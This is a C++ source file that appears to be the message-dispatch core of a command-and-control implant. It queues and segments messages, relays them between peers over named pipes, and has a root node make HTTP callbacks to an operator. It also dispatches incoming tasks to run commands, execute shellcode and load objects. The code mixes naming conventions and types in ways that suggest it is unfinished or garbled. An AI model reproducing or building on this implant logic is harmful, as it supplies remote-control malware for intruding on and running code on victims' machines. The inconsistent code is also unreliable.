#include <core/include/dispatch.hpp>

using namespace Utils;
using namespace Peers;
using namespace Stream;
using namespace Parser;
using namespace Network::Smb;
using namespace Network::Http;
using namespace Memory::Execute;
using namespace Dispatcher;

namespace Dispatcher {
    VOID AddMessage(PACKET *packet) {
        auto head = Ctx->MessageCache;

        if (!Ctx->MessageCache) {
            Ctx->MessageCache = packet;
        } else {
            while (head->Next) {
                head = head->Next;
            }

            head->Next = packet;
        }
    }

    VOID RemoveMessage(PACKET *target) {
        PACKET *prev = { };

        if (!Ctx->MessageCache || !target) {
            return;
        }

        for (auto head = Ctx->MessageCache; head; head = head->Next) {
            if (head == target) {
                if (prev) {
                    prev->Next = head->Next;
                } else {
                    Ctx->MessageCache = head->Next;
                }

                DestroyPacket(head);
                return;

            }
            prev = head;
        }
    }

	// NOTE: I feel like the architecture should just be "label inbound/outbound" then simply check all messages.
	// Named pipes are FIFO anyway, so, why not just check? Unless they're blocking, which in that case, we wouldn't need flags.
    VOID QueueSegments(UINT8* buffer, UINT32 length) {
        PACKET *queue = { };

        UINT32 offset = 0;
        UINT32 peerId = 0;
        UINT32 taskId = 0;
        UINT32 cbSeg  = 0;
        UINT32 index  = 1;

        const auto nSeg        = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
        constexpr auto mMax    = MESSAGE_MAX - SEGMENT_HEADER_SIZE;

        while (length > 0) {
            cbSeg = length > mMax ? mMax : length;
            queue = (PACKET*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, cbSeg + SEGMENT_HEADER_SIZE);

            MemCopy(&peerId, buffer, sizeof(peerId));
            MemCopy(&taskId, buffer + 4, sizeof(taskId));

            queue->PeerId = peerId;
            queue->TaskId = taskId;
            queue->MsgType = TypeSegment;

            PackUint32(queue, index);
            PackUint32(queue, nSeg);
            PackUint32(queue, cbSeg);
            PackBytes(queue, (PBYTE)buffer + offset, cbSeg);

            length -= cbSeg;
            offset += cbSeg;
            index++;

            AddMessage(queue);
        }
    }

    VOID PrepareEgress(_stream *out) {
        HEXANE;

        _parser parser = { };

        for (auto head = ctx->transport.message_queue; head; head = head->next) {
            if (head->buffer) {
                CreateParser(&parser, B_PTR(head->buffer), head->length);

                PackUint32(out, head->peer_id);
                PackUint32(out, head->task_id);
                PackUint32(out, head->type);

                ROOT_NODE 
                    ? PackBytes(out, B_PTR(head->buffer), head->length)
                    : AppendBuffer(&out->buffer, head->buffer, (uint32_t*) &out->length, head->length);

                break;
            }
        }

        DestroyParser(&parser);
    }

    VOID PrepareIngress(_stream *in) {
        HEXANE;

        if (in) {
            if (PeekPeerId(in) != ctx->session.peer_id) {
                MessageQueue(in);
            }
            else {
                CommandDispatch(in);
            }
        }
        else {
            auto head = ctx->transport.message_queue;
            while (head) {
                head->ready = FALSE;
                head = head->next;
            }
        }
    }

    BOOL DispatchRoutine() {
        BOOL success = false;
        PACKET *out = CreateStream();
        PACKET *in = { };

    retry:
        if (!ctx->transport.message_queue) {
            if (ROOT_NODE) {
                MessageQueue(CreateStreamWithHeaders(TypeTasking));
                goto retry;
            }
            else {
                return true;
            }
        }

        PrepareEgress(out);

        if (ROOT_NODE) {
            if (!HttpCallback(&in, out)) {
                goto defer;
            }
        }
        else {
            if (!PipeSend(out) || !PipeReceive(&in)) {
                goto defer;
            }
        }

        PrepareIngress(in);
        PushPeers();

		success = true;
defer:
        DestroyStream(out);
        return success;
    }

    VOID CommandDispatch (_stream *in) {
        PARSER parser = { };

        CreateParser(&parser, B_PTR(in->buffer), in->length);
        UnpackUint32(&parser);

        auto task_id = UnpackUint32(&parser);
        MemCopy(&ctx->session.current_taskid, &task_id, sizeof(uint32_t));

        switch (UnpackUint32(&parser)) {
		case TypeCheckin:
			MemSet(&ctx->session.checkin, true, sizeof(bool));
			break;
		case TypeTasking:
			ExecuteCommand(parser);
			break;
		case TypeExecute:
			ExecuteShellcode(parser);
			break;
		case TypeObject:
			LoadObject(parser);
			break;

		default:
			break;
        }

        DestroyParser(&parser);
    }
}
